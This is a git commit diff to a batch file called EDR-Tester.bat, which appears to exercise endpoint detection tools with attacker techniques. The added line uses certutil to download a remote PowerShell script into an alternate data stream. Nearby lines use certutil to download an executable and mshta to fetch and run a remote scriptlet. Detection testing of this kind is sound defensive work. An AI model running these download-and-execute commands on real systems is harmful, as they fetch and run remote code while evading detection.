ada3cbc829f7457041325e544573e325ce27c4ea
AhmetHan <han.ahmet@icloud.com>
2019-10-31 14:52:06 +0300

    Update EDR-Tester.bat

--- EDR-Tester.bat
+++ EDR-Tester.bat
@@ -240,6 +240,8 @@ ECHO ============================
 ECHO ============================
 certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
 ECHO ============================
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
+ECHO ============================
 mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
 ECHO ============================
 dir /s
